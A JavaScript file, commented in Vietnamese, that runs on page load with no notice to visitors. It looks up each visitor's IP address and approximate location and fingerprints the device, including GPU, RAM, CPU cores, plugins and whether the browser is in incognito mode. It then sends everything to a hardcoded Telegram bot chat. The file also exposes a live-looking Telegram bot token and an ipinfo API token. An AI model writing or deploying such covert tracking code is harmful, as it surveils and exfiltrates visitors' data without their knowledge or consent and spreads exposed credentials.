const TELEGRAM_BOT_TOKEN = "8150545362:AAEKUQF0tJ7qkpMajhpV48baUbZ5IHnF-HA"; // ⚠️ NÊN ĐỔI TOKEN MỚI
const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn



// 📌 Xác định tên trình duyệt chính xác
function getBrowserName() {
    const ua = navigator.userAgent;
    if (navigator.brave) return "Brave";
    if (/Edg\//.test(ua)) return "Microsoft Edge";
    if (/OPR\//.test(ua) || ua.includes("Opera")) return "Opera";
    if (/Firefox\//.test(ua)) return "Mozilla Firefox";
    if (/coc_coc_browser/.test(ua)) return "Cốc Cốc";
    if (/Chrome\//.test(ua) && !/Edg\//.test(ua) && !/OPR\//.test(ua)) return "Google Chrome";
    if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) return "Safari";
    if (/Trident\//.test(ua) || /MSIE/.test(ua)) return "Internet Explorer";
    return "Không xác định";
}

// 📌 Kiểm tra chế độ ẩn danh
async function isIncognito() {
    return new Promise((resolve) => {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) resolve(false);
        else fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
    });
}

// 📌 Lấy thông tin thiết bị
async function getDeviceFingerprint() {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    const debugInfo = gl ? gl.getExtension("WEBGL_debug_renderer_info") : null;

    return {
        browser: getBrowserName(),
        incognito: await isIncognito(),
        platform: navigator.platform || "Không xác định",
        cpuCores: navigator.hardwareConcurrency || "Không xác định",
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Không xác định",
        gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Không xác định",
        language: navigator.language || "Không xác định",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Không xác định",
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth || "Không xác định",
        plugins: navigator.plugins.length ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "Không có"
    };
}

// 📌 Lấy vị trí & gửi lên Telegram
async function sendInfoToTelegram() {
    let city = "Không xác định", region = "Không xác định", country = "Không xác định";
    let latitude = "Không xác định", longitude = "Không xác định", ipAddress = "Không xác định";

    try {
        const ipInfo = await fetch("https://ipinfo.io/json?token=ffafdfeb7f37bf").then(res => res.json());
        ({ city, region, country, ip: ipAddress } = ipInfo);
        [latitude, longitude] = ipInfo.loc ? ipInfo.loc.split(",") : ["Không xác định", "Không xác định"];
    } catch (error) {
        console.log("Lỗi API ipinfo.io, thử API khác...");
        try {
            const fallbackData = await fetch("http://ip-api.com/json/").then(res => res.json());
            city = fallbackData.city || city;
            region = fallbackData.regionName || region;
            country = fallbackData.country || country;
            ipAddress = fallbackData.query || ipAddress;
            latitude = fallbackData.lat || latitude;
            longitude = fallbackData.lon || longitude;
        } catch (fallbackError) {
            console.log("Không thể lấy vị trí từ API dự phòng.");
        }
    }

    const fingerprint = await getDeviceFingerprint();
    const now = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
    const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

    // ✉️ Gửi tin nhắn đến Telegram
    const message = `
🔍 **THÔNG TIN TRUY CẬP**
🕒 Thời gian: ${now}
📌 Địa chỉ IP: ${ipAddress}
🌍 Vị trí: [Xem trên bản đồ](${locationUrl})
🏙️ Thành phố: ${city}
🏛️ Tỉnh/Bang: ${region}
🌏 Quốc gia: ${country}

🖥️ **THÔNG TIN HỆ THỐNG**
🌐 Trình duyệt: ${fingerprint.browser}
🕵️ Ẩn danh: ${fingerprint.incognito ? "Có" : "Không"}
💻 Hệ điều hành: ${fingerprint.platform}
🧠 CPU: ${fingerprint.cpuCores} lõi
🎮 GPU: ${fingerprint.gpu}
🛠️ RAM: ${fingerprint.ram}
🖥️ Độ phân giải màn hình: ${fingerprint.screenResolution}
🎨 Độ sâu màu: ${fingerprint.colorDepth}
🔌 Plugin trình duyệt: ${fingerprint.plugins}
`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });
        console.log("Đã gửi thông tin đến Telegram");
    } catch (error) {
        console.log("Lỗi khi gửi thông tin đến Telegram:", error);
    }
}

// 📌 Chạy khi tải trang
sendInfoToTelegram();
